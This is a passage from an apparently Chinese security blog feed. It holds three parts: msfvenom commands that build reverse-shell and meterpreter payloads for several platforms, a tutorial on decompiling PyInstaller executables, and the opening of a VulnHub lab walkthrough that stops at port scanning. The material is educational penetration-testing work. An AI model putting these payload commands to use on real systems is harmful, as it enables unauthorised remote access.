<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform osx <span class="token operator">-</span>a x86 <span class="token operator">-</span>p osx<span class="token operator">/</span>x86<span class="token operator">/</span>shell_reverse_tcp <span class="token operator">-</span>f macho <span class="token operator">-</span>o payload<span class="token punctuation">.</span>macho</pre></td></tr></table></figure><h5 id="4-android"><a class="anchor" href="#4-android">#</a> <strong>4. Android</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p android<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>o payload<span class="token punctuation">.</span>apk</pre></td></tr></table></figure><h5 id="5-aspx"><a class="anchor" href="#5-aspx">#</a> <strong>5. Aspx</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token operator">-</span>f aspx <span class="token operator">-</span>o payload<span class="token punctuation">.</span>aspx</pre></td></tr></table></figure><h5 id="6-jsp"><a class="anchor" href="#6-jsp">#</a> <strong>6. Jsp</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">--</span>platform java <span class="token operator">-</span>p java<span class="token operator">/</span>jsp_shell_reverse_tcp <span class="token operator">-</span>f raw <span class="token operator">-</span>o payload<span class="token punctuation">.</span>jsp</pre></td></tr></table></figure><h5 id="7-php"><a class="anchor" href="#7-php">#</a> <strong>7. PHP</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p php<span class="token operator">/</span>meterpreter_reverse_tcp <span class="token operator">-</span>f raw <span class="token operator">-</span>o payload<span class="token punctuation">.</span>php</pre></td></tr></table></figure><h5 id="8-bash"><a class="anchor" href="#8-bash">#</a> <strong>8. Bash</strong></h5>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p cmd<span class="token operator">/</span>unix<span class="token operator">/</span>reverse_bash <span class="token operator">-</span>f raw <span class="token operator">-</span>o shell<span class="token punctuation">.</span>sh</pre></td></tr></table></figure><p>参考资料：<br />
<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvMC1VcGZDdlVWelhaa1RBRUhIcmRoUQ==">红队视角下 Linux 信息收集</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvVEROMDFLMC1jdEtwVnRfTGtqSmlhQQ=="> Linux 后渗透之信息收集（metasploit）</span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd3N6bWUvcC8xMDA0NTUzMC5odG1s">Linux 下抓取登陆用户密码神器 mimipenguin</span><br />
<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvLWlpY0RfWkJndkEtbHNjbTc1WTdYdw==">Metasploit&amp;Cobalt Strike 基础</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9mODIzODZiOGE5YWM=">MSF-Metasploit（基础）</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>pyc反编译那些事儿</title>
    <url>/article/f287aeaa.html</url>
    <content><![CDATA[<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211126213226747-173403618.jpg" alt="image" /></p>
<h2 id="内容介绍"><a class="anchor" href="#内容介绍">#</a> 内容介绍</h2>
<p>PyInstaller 封装程序的反编译：</p>
<ol>
<li>使用 PyInstaller Extractor 提取由 PyiIstaller 生成的可执行文件内容</li>
<li>使用 Uncompyle6 进行反编译</li>
</ol>
<h2 id="pyiistaller生成的可执行文件"><a class="anchor" href="#pyiistaller生成的可执行文件">#</a> PyiIstaller 生成的可执行文件</h2>
<p>如果要建立独立应用，那么需要把 python 的依赖包全部打包。<br />
安装：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>pip install pyinstaller</pre></td></tr></table></figure><p>打包：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>pyinstaller <span class="token operator">-</span>F <span class="token operator">-</span>w XXX<span class="token punctuation">.</span>py</pre></td></tr></table></figure><p>打包完成后，会建立两个文件夹，分别是 <code>build</code>  和 <code>dist</code> ，可执行文件就在 <code>dist</code>  下面，同时需要把程序用到的文件放到同一个目录（如果用的是相对路径的话）<br />
 <code>build</code>  下面有一个 <code>warn-UI.txt</code>  文件，如果打包完成后无法运行文件可以在此查看问题<br />
以下是 <code>pyinstaller</code>  的常用选项</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">-</span>h，<span class="token operator">--</span>help	查看该模块的帮助信息</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span><span class="token constant">F</span>，<span class="token operator">-</span>onefile	产生单个的可执行文件</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span>a，<span class="token operator">--</span>ascii	不包含 Unicode 字符集支持</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">-</span>d，<span class="token operator">--</span>debug	产生 debug 版本的可执行文件</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span>w，<span class="token operator">--</span>windowed，<span class="token operator">--</span>noconsolc	指定程序运行时不显示命令行窗口（仅对 Windows 有效）</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span>c，<span class="token operator">--</span>nowindowed，<span class="token operator">--</span>console	指定使用命令行窗口运行程序（仅对 Windows 有效）</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token operator">-</span>o <span class="token constant">DIR</span>，<span class="token operator">--</span>out<span class="token operator">=</span><span class="token constant">DIR</span>	指定 spec 文件的生成目录。如果没有指定，则默认使用当前目录来生成 spec 文件</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">-</span>p <span class="token constant">DIR</span>，<span class="token operator">--</span>path<span class="token operator">=</span><span class="token constant">DIR</span>	设置 Python 导入模块的路径（和设置 <span class="token constant">PYTHONPATH</span> 环境变量的作用相似）。也可使用路径分隔符（Windows 使用分号，Linux 使用冒号）来分隔多个路径</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token operator">-</span>n <span class="token constant">NAME</span>，<span class="token operator">--</span>name<span class="token operator">=</span><span class="token constant">NAME</span>	指定项目（产生的 spec）名字。如果省略该选项，那么第一个脚本的主文件名将作为 spec 的名字</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token operator">-</span><span class="token constant">D</span>，<span class="token operator">--</span>onedir	产生一个目录（包含多个文件）作为可执行程序</pre></td></tr></table></figure><h2 id="使用pyinstxtractor提取-pyc-文件"><a class="anchor" href="#使用pyinstxtractor提取-pyc-文件">#</a> 使用 PyInstxtractor 提取 *.pyc 文件</h2>
<p><strong>工具准备：</strong><br />
<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V4dHJlbWVjb2RlcnMtcmUvcHlpbnN0eHRyYWN0b3I=">PyInstaller Extractor 项目地址</span></p>
<p><strong>工作目录：</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Mode                LastWriteTime         Length Name</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span><span class="token operator">--</span>                <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>         <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">-</span>a<span class="token operator">--</span><span class="token operator">--</span>        <span class="token number">2020</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">/</span><span class="token number">24</span>     <span class="token number">15</span><span class="token operator">:</span><span class="token number">37</span>       <span class="token number">45937021</span> Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token operator">-</span>a<span class="token operator">--</span><span class="token operator">--</span>        <span class="token number">2020</span><span class="token operator">/</span><span class="token number">3</span><span class="token operator">/</span><span class="token number">25</span>     <span class="token number">14</span><span class="token operator">:</span><span class="token number">33</span>          <span class="token number">13194</span> pyinstxtractor<span class="token punctuation">.</span>py</pre></td></tr></table></figure><p><strong>提取文件：</strong></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>python pyinstxtractor<span class="token punctuation">.</span>py Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr></table></figure><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Processing Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Pyinstaller version<span class="token operator">:</span> <span class="token number">2.1</span><span class="token operator">+</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Python version<span class="token operator">:</span> <span class="token number">37</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Length <span class="token keyword">of</span> <span class="token keyword">package</span><span class="token operator">:</span> <span class="token number">45659005</span> bytes</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found <span class="token number">2823</span> files <span class="token keyword">in</span> CArchive</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Beginning extraction<span class="token operator">...</span>please standby</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyiboot01_bootstrap<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_pkgres<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_win32comgenpy<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_multiprocessing<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth_traitlets<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> pyi_rth__tkinter<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Possible entry point<span class="token operator">:</span> Main_cfg_editor<span class="token punctuation">.</span>pyc</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found <span class="token number">1627</span> files <span class="token keyword">in</span> <span class="token constant">PYZ</span> archive</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Successfully extracted pyinstaller archive<span class="token operator">:</span> Main_cfg_editor<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>You can now use a python decompiler on the pyc files within the extracted directory</pre></td></tr></table></figure><h2 id="使用uncompyle反编译-pyc-文件"><a class="anchor" href="#使用uncompyle反编译-pyc-文件">#</a> 使用 Uncompyle 反编译 *.pyc 文件</h2>
<p><strong>工作准备：</strong></p>
<p><code>Uncompyle6</code>  库的安装：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>pip install uncompyle6</pre></td></tr></table></figure><p>反编译：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>uncompyle6 Main_cfg_editor<span class="token punctuation">.</span>pyc <span class="token operator">></span> Main_cfg_editor<span class="token punctuation">.</span>py</pre></td></tr></table></figure><h2 id="常见错误信息"><a class="anchor" href="#常见错误信息">#</a> 常见错误信息</h2>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Invalid pyc<span class="token operator">/</span>pyo file <span class="token operator">-</span> Magic value mismatch<span class="token operator">!</span></pre></td></tr></table></figure><p>原因：由于每个  <code>.pyc</code>  文件都有一个 <code>magic head</code> ， <code>PyInstaller</code>  生成  <code>.exe</code>  的时候会把 <code>.pyc</code>  的  <code>magic</code>  部分去掉，在反编译的时候需要补齐，高版本  <code>PyInstxtractor 2.0</code>  已经解决这个问题。</p>
<p>如果需要手动补齐  <code>magic head</code>  的情况下：</p>
<p>使用 16 进制模式查看主文件与主文件目录下的  <code>struct</code>  文件，需要在主文件头插入 <code>16</code>  个字节与  <code>struct</code>  文件保持一致（其中前 <code>4</code>  个字节是 <code>Python</code>  编译版本，要完全一致）<br />
注意模板文件仅需要插入 <code>8</code>  个字节，与  <code>struct</code>  文件保持一致</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">ValueError</span><span class="token operator">:</span> source code string cannot contain <span class="token keyword">null</span> bytes</pre></td></tr></table></figure><p>通常在反编译后执行  <code>.py</code>  文件时发生，原因时反编译后的文件中存在一些空字符。最简单的解决办法是把文本复制到其他文本编辑器（例如 <code>UltraEdit</code> ），然后复制回来。</p>
<p><strong>如使用 python 3.9 报错</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">Error</span><span class="token operator">:</span> uncompyle6 requires Python <span class="token number">2.6</span><span class="token operator">-</span><span class="token number">3.8</span></pre></td></tr></table></figure><p>我们只需要给 <code>uncompile</code>  包加一个 3.9 支持</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211117200509607-1978387793.png" alt="image" /></p>
<p><strong>.pyc 文件首部损坏</strong></p>
<p><code>struct.pyc</code>  文件包含一个完整可用的首部，可以用来修复 <code>.pyc</code>  文件.</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2474919-20210919203104861-170616122.png" alt="image" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶场实战-CH4INRULZ_v1.0.1</title>
    <url>/article/3f0418ee.html</url>
    <content><![CDATA[<h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2>
<p>靶机下载地址:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span>entry<span class="token operator">/</span>ch4inrulz<span class="token operator">-</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">247</span><span class="token operator">/</span></pre></td></tr></table></figure><p>靶机说明：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Frank has a small website and he is a smart developer <span class="token keyword">with</span> a normal security background <span class="token punctuation">,</span> he always love to follow patterns <span class="token punctuation">,</span> your goal is to discover any critical vulnerabilities and gain access to the system <span class="token punctuation">,</span> then you need to gain root access <span class="token keyword">in</span> order to capture the root flag<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>This machine was made <span class="token keyword">for</span> Jordan’s Top hacker <span class="token number">2018</span> <span class="token constant">CTF</span> <span class="token punctuation">,</span> we tried to make it simulate a real world attacks <span class="token keyword">in</span> order to improve your penetration testing skills<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>The machine was tested on <span class="token function">vmware</span> <span class="token punctuation">(</span>player <span class="token operator">/</span> workstation<span class="token punctuation">)</span> and works without any problems <span class="token punctuation">,</span> so we recommend to use VMware to run it <span class="token punctuation">,</span> Also works fine using virtualbox<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">Difficulty</span><span class="token operator">:</span> Intermediate <span class="token punctuation">,</span> you need to think out <span class="token keyword">of</span> the box and collect all the puzzle pieces <span class="token keyword">in</span> order to <span class="token keyword">get</span> the job done<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>The machine is already got <span class="token constant">DHCP</span> enabled <span class="token punctuation">,</span> so you will not have any problems <span class="token keyword">with</span> networking<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>Happy Hacking <span class="token operator">!</span></pre></td></tr></table></figure><h2 id="环境配置"><a class="anchor" href="#环境配置">#</a> 环境配置</h2>
<p>这里使用 <code>VM workstation</code>  和 <code>VM VirtualBox</code>  进行演练</p>
<p>为了正常练习，将靶场的网卡模式设置为桥接模式，启动即可</p>
<h2 id="主机发现"><a class="anchor" href="#主机发现">#</a> 主机发现</h2>
<p>查看本机 IP：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>root@kali<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# ifconfig</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">docker0</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">4099</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">BROADCAST</span><span class="token punctuation">,</span><span class="token constant">MULTICAST</span><span class="token operator">></span>  mtu <span class="token number">1500</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        inet <span class="token number">172.17</span><span class="token number">.0</span><span class="token number">.1</span>  netmask <span class="token number">255.255</span><span class="token number">.0</span><span class="token number">.0</span>  broadcast <span class="token number">172.17</span><span class="token number">.255</span><span class="token number">.255</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        ether <span class="token number">02</span><span class="token operator">:</span><span class="token number">42</span><span class="token operator">:</span>8e<span class="token operator">:</span><span class="token number">77</span><span class="token operator">:</span><span class="token number">02</span><span class="token operator">:</span><span class="token number">02</span>  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> <span class="token constant">B</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> <span class="token constant">B</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token literal-property property">eth0</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">4163</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">BROADCAST</span><span class="token punctuation">,</span><span class="token constant">RUNNING</span><span class="token punctuation">,</span><span class="token constant">MULTICAST</span><span class="token operator">></span>  mtu <span class="token number">1500</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        inet <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span>  netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span>  broadcast <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.255</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        inet6 fe80<span class="token operator">:</span><span class="token operator">:</span>20c<span class="token operator">:</span>29ff<span class="token operator">:</span>fedc<span class="token operator">:</span><span class="token number">3789</span>  prefixlen <span class="token number">64</span>  scopeid <span class="token number">0x20</span><span class="token operator">&lt;</span>link<span class="token operator">></span></pre></td></tr><tr><td data-num="13"></td><td><pre>        ether <span class="token number">00</span><span class="token operator">:</span>0c<span class="token operator">:</span><span class="token number">29</span><span class="token operator">:</span>dc<span class="token operator">:</span><span class="token number">37</span><span class="token operator">:</span><span class="token number">89</span>  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">23392</span>  bytes <span class="token number">23815386</span> <span class="token punctuation">(</span><span class="token number">22.7</span> MiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">11929</span>  bytes <span class="token number">2517903</span> <span class="token punctuation">(</span><span class="token number">2.4</span> MiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token literal-property property">lo</span><span class="token operator">:</span> flags<span class="token operator">=</span><span class="token number">73</span><span class="token operator">&lt;</span><span class="token constant">UP</span><span class="token punctuation">,</span><span class="token constant">LOOPBACK</span><span class="token punctuation">,</span><span class="token constant">RUNNING</span><span class="token operator">></span>  mtu <span class="token number">65536</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        inet <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>  netmask <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token literal-property property">inet6</span> <span class="token operator">:</span><span class="token operator">:</span><span class="token number">1</span>  prefixlen <span class="token number">128</span>  scopeid <span class="token number">0x10</span><span class="token operator">&lt;</span>host<span class="token operator">></span></pre></td></tr><tr><td data-num="22"></td><td><pre>        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token constant">RX</span> packets <span class="token number">452</span>  bytes <span class="token number">37339</span> <span class="token punctuation">(</span><span class="token number">36.4</span> KiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token constant">RX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token constant">TX</span> packets <span class="token number">452</span>  bytes <span class="token number">37339</span> <span class="token punctuation">(</span><span class="token number">36.4</span> KiB<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token constant">TX</span> errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></pre></td></tr></table></figure><p>使用 <code>arp命令</code> 扫描本地靶机</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>arp<span class="token operator">-</span>scan <span class="token operator">-</span>l</pre></td></tr></table></figure><p>我们可以得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">Interface</span><span class="token operator">:</span> eth0<span class="token punctuation">,</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token constant">EN10MB</span><span class="token punctuation">,</span> <span class="token constant">MAC</span><span class="token operator">:</span> <span class="token number">00</span><span class="token operator">:</span>0c<span class="token operator">:</span><span class="token number">29</span><span class="token operator">:</span>dc<span class="token operator">:</span><span class="token number">37</span><span class="token operator">:</span><span class="token number">89</span><span class="token punctuation">,</span> <span class="token literal-property property">IPv4</span><span class="token operator">:</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Starting arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token number">.7</span> <span class="token keyword">with</span> <span class="token number">256</span> <span class="token function">hosts</span> <span class="token punctuation">(</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>royhills<span class="token operator">/</span>arp<span class="token operator">-</span>scan<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.1</span>    0a<span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">19</span>       <span class="token punctuation">(</span>Unknown<span class="token operator">:</span> locally administered<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.100</span>  <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span><span class="token number">49</span><span class="token operator">:</span><span class="token number">72</span><span class="token operator">:</span><span class="token number">02</span>       <span class="token constant">PCS</span> Systemtechnik GmbH</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span>  <span class="token number">08</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">27</span><span class="token operator">:</span>3f<span class="token operator">:</span>e0<span class="token operator">:</span>b0       <span class="token constant">PCS</span> Systemtechnik GmbH</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">3</span> packets received by filter<span class="token punctuation">,</span> <span class="token number">0</span> packets dropped by kernel</pre></td></tr><tr><td data-num="8"></td><td><pre>Ending arp<span class="token operator">-</span>scan <span class="token number">1.9</span><span class="token number">.7</span><span class="token operator">:</span> <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">2.009</span> <span class="token function">seconds</span> <span class="token punctuation">(</span><span class="token number">127.43</span> hosts<span class="token operator">/</span>sec<span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token number">3</span> responded</pre></td></tr></table></figure><p>从扫描得到的信息中，我们不难发现</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>目标机的ip为：<span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.118</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>本机的ip为：<span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span></pre></td></tr></table></figure><p>如不确定哪个是目标机，那么为确定目标机 IP，可以登录 ip 就可以看到相关网页内容。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115180036380-592837012.png" alt="image" /></p>
<h2 id="端口扫描"><a class="anchor" href="#端口扫描">#</a> 端口扫描</h2>
<p>使用 <code>nmap</code>  指令对目标机的端口进行扫描：</p>
